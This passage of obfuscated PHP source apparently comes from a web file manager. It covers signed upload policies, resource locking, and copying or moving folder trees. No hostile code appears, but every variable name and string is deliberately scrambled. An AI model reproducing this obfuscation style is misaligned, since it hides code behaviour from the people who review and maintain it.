array($ßå­¿Øü[1336] => $ÆÙ‘ÃÉ€), array($ßå­¿Øü[1337] => $¥ŸÛë¼ş), array($ßå­¿Øü[1338] => $òíÙ– Æ), array($ßå­¿Øü[1339] => $²†Ó¦ü”))); $œ¨Õ—¥É = base64_encode(json_encode($À®ë‹“à)); $·–çÉ¡â = hash_hmac($ßå­¿Øü[1340], $è„Ù‰«¦, $ßå­¿Øü[1341] . $this->secret, !0); $ûáŒóöş = hash_hmac($ßå­¿Øü[1340], $this->region, $·–çÉ¡â, !0); $ƒËÎ¨Ãè = hash_hmac($ßå­¿Øü[1340], $ş±™à‹², $ûáŒóöş, !0); $€â‘Œïı = hash_hmac($ßå­¿Øü[1340], $Ö…©›¯á, $ƒËÎ¨Ãè, !0); $«ïÏî™Ô = hash_hmac($ßå­¿Øü[1340], $œ¨Õ—¥É, $€â‘Œïı); $ïğ´¨¡º = array($ßå­¿Øü[210] => $ßå­¿Øü[12], $ßå­¿Øü[1342] => $ßå­¿Øü[12], $ßå­¿Øü[1298] => $ÌÆ¨šÀä, $ßå­¿Øü[1302] => $í’™ˆ©š, $ßå­¿Øü[1306] => $œ¨Õ—¥É, $ßå­¿Øü[1343] => $ÆÙ‘ÃÉ€, $ßå­¿Øü[1344] => $¥ŸÛë¼ş, $ßå­¿Øü[1345] => $òíÙ– Æ, $ßå­¿Øü[1346] => $²†Ó¦ü”, $ßå­¿Øü[1347] => $«ïÏî™Ô, $ßå­¿Øü[174] => $this->getHost()); return $ïğ´¨¡º; } } goto c¿é²§Œ²ñ; FÊçî¦Ùº: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Íù¡œîâ) { $‰Ğì…­ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->allowLock()) { return; } $this->_lockCheck($‰Ğì…­[549], $Íù¡œîâ); $–øÊÓŠÈ = 1; $this->_lockEvent($Íù¡œîâ, array($‰Ğì…­[550], $‰Ğì…­[551]), $–øÊÓŠÈ); $this->_lockParent($Íù¡œîâ, array($‰Ğì…­[551]), $–øÊÓŠÈ); $this->_lockEvent($Íù¡œîâ, array($‰Ğì…­[552], $‰Ğì…­[553]), $–øÊÓŠÈ); $this->_lockCheckEnd($‰Ğì…­[549], $Íù¡œîâ); } public function lockCopyEnd($”¬„Æ¡×) { $·¨Ã‚‘‹ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->allowLock()) { return; } $Ñ•ğ´¹ = 0; $this->_lockEvent($”¬„Æ¡×, array($·¨Ã‚‘‹[550], $·¨Ã‚‘‹[551]), $Ñ•ğ´¹); $this->_lockParent($”¬„Æ¡×, array($·¨Ã‚‘‹[551]), $Ñ•ğ´¹); $this->_lockEvent($”¬„Æ¡×, array($·¨Ã‚‘‹[552], $·¨Ã‚‘‹[553]), $Ñ•ğ´¹); } public function lockWriteStart($ˆüßòéå, $¢€´ø¤Ó = '') { $È®ßíò‘ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->allowLock()) { return; } $this->_lockCheck($È®ßíò‘[550], $ˆüßòéå); $€¸Ó «Ê = 1; $this->_lockKey($È®ßíò‘[554] . $ˆüßòéå . $È®ßíò‘[10] . $¢€´ø¤Ó, $€¸Ó «Ê); $this->_lockEvent($ˆüßòéå, array($È®ßíò‘[549], $È®ßíò‘[551]), $€¸Ó «Ê); $this->_lockParent($ˆüßòéå, array($È®ßíò‘[549], $È®ßíò‘[551]), $€¸Ó «Ê); $this->_lockCheckEnd($È®ßíò‘[550], $ˆüßòéå); } public function lockWriteEnd($ÄÅó®Ê, $°‚×Ø€¹ = '') { $êÜµ´›Ú =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->allowLock()) { return; } $ã×«ú´ = 0; $this->_lockKey($êÜµ´›Ú[554] . $ÄÅó®Ê . $êÜµ´›Ú[10] . $°‚×Ø€¹, $ã×«ú´); $this->_lockEvent($ÄÅó®Ê, array($êÜµ´›Ú[549], $êÜµ´›Ú[551]), $ã×«ú´); $this->_lockParent($ÄÅó®Ê, array($êÜµ´›Ú[549], $êÜµ´›Ú[551]), $ã×«ú´); } public function lockMoveStart($ş…æİºè) { $õê÷Ä² =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->allowLock()) { return; } $this->_lockCheck($õê÷Ä²[551], $ş…æİºè); $µâ¼ö›Ü = 1; $this->_lockKey($õê÷Ä²[555] . $ş…æİºè, $µâ¼ö›Ü); $this->_lockEvent($ş…æİºè, array($õê÷Ä²[549], $õê÷Ä²[550]), $µâ¼ö›Ü); $this->_lockParent($ş…æİºè, array($õê÷Ä²[549], $õê÷Ä²[551]), $µâ¼ö›Ü); $this->_lockEvent($ş…æİºè, array($õê÷Ä²[556], $õê÷Ä²[552], $õê÷Ä²[553]), $µâ¼ö›Ü); $this->_lockCheckEnd($õê÷Ä²[551], $ş…æİºè); } public function lockMoveEnd($Ğ“±Ù¥›) { $ Òü¢¾œ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->allowLock()) { return; } $ŸçüöêÜ = 0; $this->_lockKey($ Òü¢¾œ[555] . $Ğ“±Ù¥›, $ŸçüöêÜ); $this->_lockEvent($Ğ“±Ù¥›, array($ Òü¢¾œ[549], $ Òü¢¾œ[550]), $ŸçüöêÜ); $this->_lockParent($Ğ“±Ù¥›, array($ Òü¢¾œ[549], $ Òü¢¾œ[551]), $ŸçüöêÜ); $this->_lockEvent($Ğ“±Ù¥›, array($ Òü¢¾œ[556], $ Òü¢¾œ[552], $ Òü¢¾œ[553]), $ŸçüöêÜ); } private function _lockCheck($»ˆí–‡æ, $‡¢™Ï¨Õ) { $Ç– ¬€ =& $_SERVER[¥Ÿ©ÒèÌ]; $·º¢«Úõ = $this->sourceInfo($‡¢™Ï¨Õ); $ğ¥”Í = $»ˆí–‡æ . $Ç– ¬€[10] . $‡¢™Ï¨Õ; $this->_lockTimeStart[$ğ¥”Í] = timeFloat(); if (!is_array($·º¢«Úõ)) { return; } $À«ëî½í = LNG($Ç– ¬€[557]); CacheLock::setErrorMsg($Ç– ¬€[159] . htmlspecialchars($·º¢«Úõ[$Ç– ¬€[32]]) . $Ç– ¬€[536] . $À«ëî½í); $this->_lockKey($ğ¥”Í, 1); $this->_lockKey($ğ¥”Í, 0); $÷Ä²ñğ‘ = array_reverse($this->parentLevelArray($·º¢«Úõ[$Ç– ¬€[521]])); foreach ($÷Ä²ñğ‘ as $’î–¹àÄ) { $ğ¥”Í = $»ˆí–‡æ . $Ç– ¬€[558] . $’î–¹àÄ; if (CacheLock::lockGet($Ç– ¬€[559] . $ğ¥”Í)) { $·º¢«Úõ = $this->sourceInfo($’î–¹àÄ); CacheLock::setErrorMsg($Ç– ¬€[159] . htmlspecialchars($·º¢«Úõ[$Ç– ¬€[32]]) . $Ç– ¬€[536] . $À«ëî½í); $this->_lockKey($ğ¥”Í, 1); $this->_lockKey($ğ¥”Í, 0); } } } private function _lockCheckEnd($Ä¢“İ™Õ, $ÁÊ¦½´Ñ) { $Øˆ–òÇµ =& $_SERVER[¥Ÿ©ÒèÌ]; $êØœæÃµ = $Ä¢“İ™Õ . $Øˆ–òÇµ[10] . $ÁÊ¦½´Ñ; CacheLock::setErrorMsg($Øˆ–òÇµ[382]); if (!isset($this->_lockTimeStart[$êØœæÃµ])) { return; } $÷û÷Œ‰ì = timeFloat() - $this->_lockTimeStart[$êØœæÃµ]; unset($this->_lockTimeStart[$êØœæÃµ]); if ($÷û÷Œ‰ì > 0.5) { unset(self::$cacheSourceInfo[$Øˆ–òÇµ[458] . $ÁÊ¦½´Ñ]); } $½Ìò Õï = $this->sourceInfo($ÁÊ¦½´Ñ); if (!$½Ìò Õï) { show_json(LNG($Øˆ–òÇµ[106]), !1); } } private function _lockParent($–€À©¥¹, $ƒ˜û›ı‹, $¥±ò±«ë) { if (!$this->autoLockSet) { return; } $ÎÔÙ°† = $this->sourceInfo($–€À©¥¹); if (!is_array($ÎÔÙ°†)) { return; } $†¤õ‹ìÏ = array_reverse($this->parentLevelArray($ÎÔÙ°†[$_SERVER[¥Ÿ©ÒèÌ][521]])); foreach ($†¤õ‹ìÏ as $½óë—òš) { $this->_lockEvent($½óë—òš, $ƒ˜û›ı‹, $¥±ò±«ë); } } private function _lockEvent($·¬Ú¨‰•, $Ÿë´©, $Äƒ˜êÂŞ) { $ô»“àè“ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->autoLockSet) { return; } foreach ($Ÿë´© as $‹ñü“) { $àÃš€–¦ = $‹ñü“ . $ô»“àè“[10] . $·¬Ú¨‰•; if ($Äƒ˜êÂŞ && CacheLock::lockGet($ô»“àè“[559] . $àÃš€–¦)) { continue; } $this->_lockKey($àÃš€–¦, $Äƒ˜êÂŞ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ùÊ¥«, $•¾ØçÍà = 1) { $Ï…÷äÄŒ = $_SERVER[¥Ÿ©ÒèÌ][559] . md5($ùÊ¥«); if ($•¾ØçÍà) { if (isset(self::$_lockItemArr[$Ï…÷äÄŒ])) { return; } self::$_lockItemArr[$Ï…÷äÄŒ] = 1; CacheLock::lock($Ï…÷äÄŒ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ï…÷äÄŒ])) { return; } unset(self::$_lockItemArr[$Ï…÷äÄŒ]); CacheLock::unlock($Ï…÷äÄŒ); } } public function isParentOf($Õ«Ê›Áœ, $ò¦ÖÍ) { $¯Œ¾ÌÕ¾ =& $_SERVER[¥Ÿ©ÒèÌ]; $ŞäğÙÊö = $this->sourceInfo($Õ«Ê›Áœ); $Šş“¶ŠÅ = $this->sourceInfo($ò¦ÖÍ); $ƒã¶Õ‘Û = $ŞäğÙÊö[$¯Œ¾ÌÕ¾[521]] . $ŞäğÙÊö[$¯Œ¾ÌÕ¾[403]] . $¯Œ¾ÌÕ¾[50]; $²ÓÕ±¤ş = $Šş“¶ŠÅ[$¯Œ¾ÌÕ¾[521]] . $Šş“¶ŠÅ[$¯Œ¾ÌÕ¾[403]] . $¯Œ¾ÌÕ¾[50]; $¹ß‘Í¶‰ = strpos($²ÓÕ±¤ş, $ƒã¶Õ‘Û) === 0; return $¹ß‘Í¶‰; } private $targetIsDelete = 0; public function copy($—ùŞÖ‰ş, $í®êæÀÔ, $Ş‰†äç = REPEAT_REPLACE, $¾ŸèÏ¹û = '') { $ÈÎçÍÄÒ =& $_SERVER[¥Ÿ©ÒèÌ]; $µãŒãª† = $this->sourceInfo($—ùŞÖ‰ş); $´˜ªäÂ = $this->sourceInfo($í®êæÀÔ); if (!$µãŒãª† || !$´˜ªäÂ || $´˜ªäÂ[$ÈÎçÍÄÒ[411]] != $ÈÎçÍÄÒ[89]) { return !1; } if ($this->isParentOf($—ùŞÖ‰ş, $í®êæÀÔ)) { return !1; } $ö¯¡×ºÇ = $¾ŸèÏ¹û ? $¾ŸèÏ¹û : $µãŒãª†[$ÈÎçÍÄÒ[32]]; $this->lockCopyStart($—ùŞÖ‰ş); $this->lockWriteStart($í®êæÀÔ, $ö¯¡×ºÇ); $Õ¦ŒŒĞî = array($ÈÎçÍÄÒ[560] => array(), $ÈÎçÍÄÒ[561] => array(), $ÈÎçÍÄÒ[562] => array()); $this->targetIsDelete = intval($µãŒãª†[$ÈÎçÍÄÒ[431]]); $ÚÇé’ü± = $this->fileNameExistCache($í®êæÀÔ, $µãŒãª†[$ÈÎçÍÄÒ[32]]); $èÀÆÑÔ = $this->_copy($—ùŞÖ‰ş, $í®êæÀÔ, $Ş‰†äç, $Õ¦ŒŒĞî, !0, $¾ŸèÏ¹û); $this->_childrenListClear(); $this->lockCopyEnd($—ùŞÖ‰ş); $this->lockWriteEnd($í®êæÀÔ, $ö¯¡×ºÇ); if ($µãŒãª†[$ÈÎçÍÄÒ[411]] == $ÈÎçÍÄÒ[89] && $ÚÇé’ü± == $èÀÆÑÔ) { $this->folderSizeResetChildren($ÚÇé’ü±); } Model($ÈÎçÍÄÒ[563])->addAll($Õ¦ŒŒĞî[$ÈÎçÍÄÒ[561]], array(), !0); if ($ÚÇé’ü± != $èÀÆÑÔ || $µãŒãª†[$ÈÎçÍÄÒ[411]] == $ÈÎçÍÄÒ[89]) { Model($ÈÎçÍÄÒ[564])->eventCopy($èÀÆÑÔ); } $this->saveAll($Õ¦ŒŒĞî[$ÈÎçÍÄÒ[562]]); Model($ÈÎçÍÄÒ[192])->linkAdd($Õ¦ŒŒĞî[$ÈÎçÍÄÒ[560]]); $this->folderSizeReset($í®êæÀÔ); $this->updateModifyTime($í®êæÀÔ); return $èÀÆÑÔ; } private function _copy($ÛìÃ£âÍ, $ÏÒ„¾âÕ, $ÓÕò­£å, &$Ğº÷ÊÉ, $»³ ×¦é, $€Üë“÷Ç = '') { $¯ÁÎ™·¹ =& $_SERVER[¥Ÿ©ÒèÌ]; $ç¦†ÜÕ = $this->sourceInfoCache($ÛìÃ£âÍ); $õÕ˜Ê³¬ = $ç¦†ÜÕ[$¯ÁÎ™·¹[411]] == $¯ÁÎ™·¹[89]; $Ğºšíµâ = $€Üë“÷Ç ? $€Üë“÷Ç : $ç¦†ÜÕ[$¯ÁÎ™·¹[32]]; $€ğÛ‰×Ê = $this->fileNameExistCache($ÏÒ„¾âÕ, $Ğºšíµâ); if ($»³ ×¦é) { $this->_childrenAllMake($ÛìÃ£âÍ); if ($õÕ˜Ê³¬ && $€ğÛ‰×Ê) { $this->_childrenAllMake($€ğÛ‰×Ê); } } if (!$€ğÛ‰×Ê) { return $this->_copyCreate($ÛìÃ£âÍ, $ÏÒ„¾âÕ, $Ğºšíµâ, $Ğº÷ÊÉ); } $âÕ³İíÙ = $€ğÛ‰×Ê; if ($õÕ˜Ê³¬) { if ($ÓÕò­£å == REPEAT_RENAME_FOLDER) { $Ğºšíµâ = $this->fileNameAutoCache($ÏÒ„¾âÕ, $Ğºšíµâ, $ÓÕò­£å, $õÕ˜Ê³¬); $âÕ³İíÙ = $this->_copyCreate($ÛìÃ£âÍ, $ÏÒ„¾âÕ, $Ğºšíµâ, $Ğº÷ÊÉ); } else { $¨‹ğ¿Ù = $this->_childrenList($ÛìÃ£âÍ); foreach ($¨‹ğ¿Ù as $“Õ›¦•®) { $this->_copy($“Õ›¦•®[$¯ÁÎ™·¹[403]], $€ğÛ‰×Ê, $ÓÕò­£å, $Ğº÷ÊÉ, !1); } } } else { if ($ÓÕò­£å == REPEAT_RENAME || $ÓÕò­£å == REPEAT_RENAME_FOLDER) { $Ğºšíµâ = $this->fileNameAutoCache($ÏÒ„¾âÕ, $Ğºšíµâ, $ÓÕò­£å, $õÕ˜Ê³¬); $âÕ³İíÙ = $this->_copyCreate($ÛìÃ£âÍ, $ÏÒ„¾âÕ, $Ğºšíµâ, $Ğº÷ÊÉ); } else { if ($ÓÕò­£å == REPEAT_REPLACE) { $ü…¦šˆ¨ = $this->sourceInfoCache($€ğÛ‰×Ê); $ÓÕÇııë = $this->fileHistory($ü…¦šˆ¨, $ç¦†ÜÕ[$¯ÁÎ™·¹[467]], $ç¦†ÜÕ[$¯ÁÎ™·¹[80]]); if ($ÓÕÇııë) { $Ğº÷ÊÉ[$¯ÁÎ™·¹[560]][] = $ç¦†ÜÕ[$¯ÁÎ™·¹[467]]; } } else { if ($ÓÕò­£å == REPEAT_SKIP) { } } } Hook::trigger($¯ÁÎ™·¹[565], array($¯ÁÎ™·¹[566], $ç¦†ÜÕ, 0)); } return $âÕ³İíÙ; } private function _copyCreate($¡¤¼°œ¯, $Ñ±ö„‚š, $š´ÊìŒ’, &$éƒşÔñ) { $–öøÌû =& $_SERVER[¥Ÿ©ÒèÌ]; $‹“âõ±ğ = $this->sourceInfoCache($¡¤¼°œ¯); $¹˜ğ¼Ùò = $this->sourceInfoCache($Ñ±ö„‚š); $ª¨²ÄœĞ = $this->_makeItemData($‹“âõ±ğ, $¹˜ğ¼Ùò, $š´ÊìŒ’); Hook::trigger($–öøÌû[567], $ª¨²ÄœĞ); Hook::trigger($–öøÌû[568], array($–öøÌû[569], $ª¨²ÄœĞ, 0)); $Ë©—„¶Ô = $this->add($ª¨²ÄœĞ); $‹ÂƒÚû¢ = array($–öøÌû[403] => $Ë©—„¶Ô, $–öøÌû[32] => $š´ÊìŒ’); $this->_copyApplyMeta($‹ÂƒÚû¢, $éƒşÔñ); if ($‹“âõ±ğ[$–öøÌû[411]] != $–öøÌû[89]) { $éƒşÔñ[$–öøÌû[560]][] = $‹“âõ±ğ[$–öøÌû[467]]; return $Ë©—„¶Ô; } $â‰øé–ê = array(); $¤åî‡àÍ = array(); $this->_childrenListAll($¡¤¼°œ¯, $â‰øé–ê); $×Ò¡á “ = count($â‰øé–ê); if ($×Ò¡á “ == 0) { return $Ë©—„¶Ô; } $ØËâà²± = $this->sourceInfo($Ë©—„¶Ô); foreach ($â‰øé–ê as $éüØÛ§¨) { $›ÑĞÌğç = $this->_makeItemData($éüØÛ§¨, $ØËâà²±, $éüØÛ§¨[$–öøÌû[32]]); $›ÑĞÌğç[$–öøÌû[521]] = $éüØÛ§¨[$–öøÌû[521]]; $¤åî‡àÍ[] = $›ÑĞÌğç; } $this->chunkEventSet($–öøÌû[570], array($–öøÌû[571], $ª¨²ÄœĞ, $×Ò¡á “)); $this->addAll($¤åî‡àÍ, array(), !1); $ª´ùş–Ô = $this->where(array($–öøÌû[498] => $Ë©—„¶Ô))->select(); $¨Ë½Üìˆ = $this->_childrenMakeRelation($â‰øé–ê, $ª´ùş–Ô); $¨Ë½Üìˆ[$¡¤¼°œ¯] = $Ë©—„¶Ô; $ÁÄçç„é = array(); $€Å´­ø« = array(); foreach ($ª´ùş–Ô as $éüØÛ§¨) { $çò…­Å¿ = $éüØÛ§¨[$–öøÌû[403]]; $®ŒŒÛ = $this->_childrenMatch($¨Ë½Üìˆ, $éüØÛ§¨, $ØËâà²±); $ÁÄçç„é[] = array($–öøÌû[403], $çò…­Å¿, $–öøÌû[498], $®ŒŒÛ[$–öøÌû[498]]); $€Å´­ø«[] = array($–öøÌû[403], $çò…­Å¿, $–öøÌû[521], $®ŒŒÛ[$–öøÌû[521]]); $this->_copyApplyMeta($éüØÛ§¨, $éƒşÔñ); if ($éüØÛ§¨[$–öøÌû[411]] != $–öøÌû[89]) { $éƒşÔñ[$–öøÌû[560]][] = $éüØÛ§¨[$–öøÌû[467]]; } } $this->chunkEventSet($–öøÌû[572], array($–öøÌû[573], $ª¨²ÄœĞ, $×Ò¡á “)); $this->saveAll($ÁÄçç„é); $this->chunkEventSet($–öøÌû[574], array($–öøÌû[575], $ª¨²ÄœĞ, $×Ò¡á “)); $this->saveAll($€Å´­ø«); return $Ë©—„¶Ô; } private function _childrenMakeRelation($³ìïëš, $“ş—÷é’) { $Å™Í·Ë =& $_SERVER[¥Ÿ©ÒèÌ]; $äõ†ï…° = array(); $Ÿ–çõ­ = array(); foreach ($³ìïëš as $›‰¢§¤) { $…°©óêì = $›‰¢§¤[$Å™Í·Ë[32]] . $Å™Í·Ë[8] . $›‰¢§¤[$Å™Í·Ë[521]]; $äõ†ï…°[$…°©óêì] = $›‰¢§¤[$Å™Í·Ë[403]]; } foreach ($“ş—÷é’ as $›‰¢§¤) { $…°©óêì = $›‰¢§¤[$Å™Í·Ë[32]] . $Å™Í·Ë[8] . $›‰¢§¤[$Å™Í·Ë[521]]; $›êçìå = $äõ†ï…°[$…°©óêì]; $Ÿ–çõ­[$›êçìå] = $›‰¢§¤[$Å™Í·Ë[403]]; } return $Ÿ–çõ­; } private function _childrenMatch($È÷×Û½, $ã­©¸Ğ, $Ó¤èËœ®) { $åóî‚¥² =& $_SERVER[¥Ÿ©ÒèÌ]; $Ö¤ËÕñš = $Ó¤èËœ®[$åóî‚¥²[521]]; $ÑÇ”¦í¨ = $this->parentLevelArray($ã­©¸Ğ[$åóî‚¥²[521]]); foreach ($ÑÇ”¦í¨ as $ØˆÁíÃ) { if (isset($È÷×Û½[$ØˆÁíÃ])) { $Ö¤ËÕñš .= $È÷×Û½[$ØˆÁíÃ] . $åóî‚¥²[576]; } } $Ö¤ËÕñš = rtrim($Ö¤ËÕñš, $åóî‚¥²[50]) . $åóî‚¥²[50]; $Ó¯ŸÃŞª = $this->parentLevelArray($Ö¤ËÕñš); $«ë£ÛÁ = $Ó¯ŸÃŞª[count($Ó¯ŸÃŞª) - 1]; return array($åóî‚¥²[498] => $«ë£ÛÁ, $åóî‚¥²[521] => $Ö¤ËÕñš); } private function _makeItemData($¿ì¶Œé, $şß¸¿™…, $×úÈàŞ³) { $ÆˆŞàÉø =& $_SERVER[¥Ÿ©ÒèÌ]; $­îôĞ = array($ÆˆŞàÉø[577] => $¿ì¶Œé[$ÆˆŞàÉø[411]], $ÆˆŞàÉø[421] => $×úÈàŞ³, $ÆˆŞàÉø[578] => $¿ì¶Œé[$ÆˆŞàÉø[413]] ? $¿ì¶Œé[$ÆˆŞàÉø[413]] : $ÆˆŞàÉø[12], $ÆˆŞàÉø[468] => $¿ì¶Œé[$ÆˆŞàÉø[467]] ? $¿ì¶Œé[$ÆˆŞàÉø[467]] : 0, $ÆˆŞàÉø[579] => $¿ì¶Œé[$ÆˆŞàÉø[80]] ? $¿ì¶Œé[$ÆˆŞàÉø[80]] : 0, $ÆˆŞàÉø[580] => intval($şß¸¿™…[$ÆˆŞàÉø[412]]), $ÆˆŞàÉø[581] => intval($şß¸¿™…[$ÆˆŞàÉø[504]]), $ÆˆŞàÉø[582] => intval(USER_ID), $ÆˆŞàÉø[583] => intval(USER_ID), $ÆˆŞàÉø[402] => intval($şß¸¿™…[$ÆˆŞàÉø[403]]), $ÆˆŞàÉø[584] => $şß¸¿™…[$ÆˆŞàÉø[521]] . $şß¸¿™…[$ÆˆŞàÉø[403]] . $ÆˆŞàÉø[50], $ÆˆŞàÉø[425] => $¿ì¶Œé[$ÆˆŞàÉø[86]] ? $¿ì¶Œé[$ÆˆŞàÉø[86]] : time(), $ÆˆŞàÉø[430] => 0, $ÆˆŞàÉø[585] => $ÆˆŞàÉø[12]); return $­îôĞ; } private function _copyApplyMeta($äæ»£ıØ, &$é¬ÆôÔÙ) { $ä‡©ƒğ­ =& $_SERVER[¥Ÿ©ÒèÌ]; $ĞöĞÕÍ = $äæ»£ıØ[$ä‡©ƒğ­[403]]; $ÅÌØĞß• = $äæ»£ıØ[$ä‡©ƒğ­[32]]; if (!isset($äæ»£ıØ[$ä‡©ƒğ­[586]]) || !$äæ»£ıØ[$ä‡©ƒğ­[586]] || $äæ»£ıØ[$ä‡©ƒğ­[586]] == $ä‡©ƒğ­[190]) { $é¬ÆôÔÙ[$ä‡©ƒğ­[562]][] = array($ä‡©ƒğ­[403], $ĞöĞÕÍ, $ä‡©ƒğ­[586], short_id($ĞöĞÕÍ)); } if (Input::check($ÅÌØĞß•, $ä‡©ƒğ­[587])) { $é¬ÆôÔÙ[$ä‡©ƒğ­[561]][] = array($ä‡©ƒğ­[403] => $ĞöĞÕÍ, $ä‡©ƒğ­[95] => $ä‡©ƒğ­[464], $ä‡©ƒğ­[378] => str_replace($ä‡©ƒğ­[53], $ä‡©ƒğ­[12], Pinyin::get($ÅÌØĞß•))); $é¬ÆôÔÙ[$ä‡©ƒğ­[561]][] = array($ä‡©ƒğ­[403] => $ĞöĞÕÍ, $ä‡©ƒğ­[95] => $ä‡©ƒğ­[463], $ä‡©ƒğ­[378] => Pinyin::get($ÅÌØĞß•, $ä‡©ƒğ­[588])); } $é¬ÆôÔÙ[$ä‡©ƒğ­[561]][] = array($ä‡©ƒğ­[403] => $ĞöĞÕÍ, $ä‡©ƒğ­[95] => $ä‡©ƒğ­[442], $ä‡©ƒğ­[378] => KodSort::makeStr($ÅÌØĞß•)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ö´ÑÕÀ«) { $ÊçÂ«šÓ =& $_SERVER[¥Ÿ©ÒèÌ]; $ŞŸˆÊêô = $this->sourceInfo($Ö´ÑÕÀ«); $›ºó´Ú = $ÊçÂ«šÓ[589]; $ÉàˆÚ˜İ = array($ÊçÂ«šÓ[521] => array($ÊçÂ«šÓ[544], $ŞŸˆÊêô[$ÊçÂ«šÓ[521]] . $Ö´ÑÕÀ« . $ÊçÂ«šÓ[545]), $ÊçÂ«šÓ[431] => $this->targetIsDelete); $Ú•õœ¸¾ = $this->field($›ºó´Ú)->where($ÉàˆÚ˜İ)->select(); if (!$Ú•õœ¸¾) { return; } $Ú•õœ¸¾ = array_to_keyvalue($Ú•õœ¸¾, $ÊçÂ«šÓ[403]); foreach ($Ú•õœ¸¾ as $øƒØ½Š“) { $ï‘èâë = $øƒØ½Š“[$ÊçÂ«šÓ[498]]; $Ö´ÑÕÀ« = $øƒØ½Š“[$ÊçÂ«šÓ[403]]; if (!isset($this->_childrenListCache[$Ö´ÑÕÀ«]) && $øƒØ½Š“[$ÊçÂ«šÓ[411]] == $ÊçÂ«šÓ[89]) { $this->_childrenListCache[$Ö´ÑÕÀ«] = array(); } if (!isset($this->_childrenListCache[$ï‘èâë])) { $this->_childrenListCache[$ï‘èâë] = array(); } $this->_childrenListCache[$ï‘èâë][$Ö´ÑÕÀ«] = $øƒØ½Š“; $this->_childrenItemCache[$Ö´ÑÕÀ«] = $øƒØ½Š“; } } private function _childrenListAll($Á•ğÎ¬ê, &$“œåŠ¾Ã) { $¢ÂÙ´À =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($this->_childrenListCache[$Á•ğÎ¬ê])) { return; } $³ª¤âˆ = $this->_childrenListCache[$Á•ğÎ¬ê]; foreach ($³ª¤âˆ as $“Åé·½  => $óñä¥¶ˆ) { $“œåŠ¾Ã[$“Åé·½ ] = $óñä¥¶ˆ; if ($óñä¥¶ˆ[$¢ÂÙ´À[411]] == $¢ÂÙ´À[89]) { $this->_childrenListAll($“Åé·½ , $“œåŠ¾Ã); } } } private function sourceInfoCache($‚Ãé¦ºé) { if (isset($this->_childrenItemCache[$‚Ãé¦ºé])) { return $this->_childrenItemCache[$‚Ãé¦ºé]; } return $this->sourceInfo($‚Ãé¦ºé); } private function _childrenList($•ÓéÙÔ×) { if (isset($this->_childrenListCache[$•ÓéÙÔ×])) { return $this->_childrenListCache[$•ÓéÙÔ×]; } return $this->_childrenListSelect($•ÓéÙÔ×); } private function _childrenListSelect($ÇÍŞ÷Ã) { $Éç¥–ïì =& $_SERVER[¥Ÿ©ÒèÌ]; $ŒÙŒş’÷ = array($Éç¥–ïì[498] => $ÇÍŞ÷Ã, $Éç¥–ïì[431] => $this->targetIsDelete); $‚×Äú² = $this->where($ŒÙŒş’÷)->select(); $‚×Äú² = $‚×Äú² ? $‚×Äú² : array(); $æúÂ‰»Î = array_to_keyvalue($‚×Äú², $Éç¥–ïì[403]); $this->_childrenListCache[$ÇÍŞ÷Ã] = $æúÂ‰»Î; foreach ($æúÂ‰»Î as $ÇÍŞ÷Ã => $ğ¼ÕôÉá) { $this->_childrenItemCache[$ÇÍŞ÷Ã] = $ğ¼ÕôÉá; } return $æúÂ‰»Î; } private function fileNameExistCache($±Àş‡¶, $¡ä·¨’) { $ÜåÈ¤¡ =& $_SERVER[¥Ÿ©ÒèÌ]; $¡ä·¨’ = strtolower($¡ä·¨’); $ûü±ö£† = $this->_childrenList($±Àş‡¶); foreach ($ûü±ö£† as $Îéƒáœ®) { if ($¡ä·¨’ == strtolower($Îéƒáœ®[$ÜåÈ¤¡[32]])) { return $Îéƒáœ®[$ÜåÈ¤¡[403]]; } } return !1; } private function fileNameAutoCache($òå‡ÕÓ, $²˜ùØ›°, $Í·şæ¾¾, $½² ıúŒ) { $‡“ø¹óø =& $_SERVER[¥Ÿ©ÒèÌ]; $ëÒá‰îÇ = $this->_childrenList($òå‡ÕÓ); $ØÖÏÆ = array_to_keyvalue($ëÒá‰îÇ, $‡“ø¹óø[12], $‡“ø¹óø[32]); return $this->fileNameAutoGet($ØÖÏÆ, $²˜ùØ›°, $Í·şæ¾¾, $½² ıúŒ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Çü›Ã®‰, $ùıÀ†¦¡, $í€ßœ—ü = REPEAT_REPLACE, $ëŒèä˜º = '') { $ŠÕ™ì¿ã =& $_SERVER[¥Ÿ©ÒèÌ]; $ïÚ×İ¿æ = $this->sourceInfo($Çü›Ã®‰); $ÓÈæ÷Î = $this->sourceInfo($ùıÀ†¦¡); if ($ïÚ×İ¿æ[$ŠÕ™ì¿ã[498]] == $ÓÈæ÷Î[$ŠÕ™ì¿ã[403]]) { if ($ïÚ×İ¿æ[$ŠÕ™ì¿ã[431]] == $ŠÕ™ì¿ã[89]) { Model($ŠÕ™ì¿ã[429])->restore(array($Çü›Ã®‰)); } if (!$ëŒèä˜º || $ëŒèä˜º == $ïÚ×İ¿æ[$ŠÕ™ì¿ã[32]]) { return $Çü›Ã®‰; } } $•Ê¨¾ÍĞ = $this->pathInfoMore($Çü›Ã®‰); if ($this->isParentOf($Çü›Ã®‰, $ùıÀ†¦¡)) { return !1; } if (!$ïÚ×İ¿æ || !$ÓÈæ÷Î || $ÓÈæ÷Î[$ŠÕ™ì¿ã[411]] != $ŠÕ™ì¿ã[89]) { return !1; } Hook::trigger($ŠÕ™ì¿ã[590], $•Ê¨¾ÍĞ); $this->targetIsDelete = intval($ïÚ×İ¿æ[$ŠÕ™ì¿ã[431]]); if ($ïÚ×İ¿æ[$ŠÕ™ì¿ã[498]] == $ùıÀ†¦¡ && $ëŒèä˜º != $ïÚ×İ¿æ[$ŠÕ™ì¿ã[32]]) { $ú¶‡†» = $this->fileNameExist($ùıÀ†¦¡, 